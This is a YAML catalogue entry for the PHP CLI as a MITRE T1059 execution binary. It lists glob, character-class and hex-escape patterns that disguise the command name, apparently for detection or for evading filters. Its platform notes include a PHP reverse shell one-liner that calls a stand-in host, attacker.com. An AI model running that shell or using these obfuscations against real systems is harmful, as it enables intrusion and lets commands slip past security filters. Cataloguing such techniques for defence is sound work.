---
Name: php
Description: "PHP CLI interpreter. Can execute arbitrary PHP code, spawn reverse shells, read/write files, and make network connections."
Platform: linux
BinaryPath:
  - /usr/bin/php
  - /usr/bin/php8
  - /usr/bin/php7
  - /bin/php
Category: execution
MitreID: T1059
Patterns:
  - Pattern: "p?p"
    Wildcards: ["?"]
    Notes: "Single wildcard replaces 'h' — note: may also match pip; use full path or longer glob to disambiguate"
  - Pattern: "ph?"
    Wildcards: ["?"]
    Notes: "Wildcard replaces 'p' suffix"
  - Pattern: "p[h]p"
    Wildcards: ["[]"]
    Notes: "Character class around 'h'"
  - Pattern: "/usr/bin/p?p"
    Wildcards: ["?"]
    Notes: "Full path wildcard — more precise than bare p?p"
  - Pattern: "/???/bin/p?p"
    Wildcards: ["?"]
    Notes: "Obfuscate both /usr/ and the 'h' in php"
  - Pattern: "$(ls /usr/bin/p?p)"
    Wildcards: ["?"]
    Notes: "ls resolves glob to /usr/bin/php; command substitution executes it"
  - Pattern: "$'\\x70\\x68\\x70'"
    Wildcards: []
    Notes: "ANSI-C hex escapes expand to 'php'"
PlatformNotes: |
  PHP reverse shell one-liner: `php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`. The CLI binary may be versioned (`php8`, `php7.4`) — adjust glob accordingly.
Resources:
  - https://attack.mitre.org/techniques/T1059/
  - https://www.php.net/manual/en/features.commandline.php
---
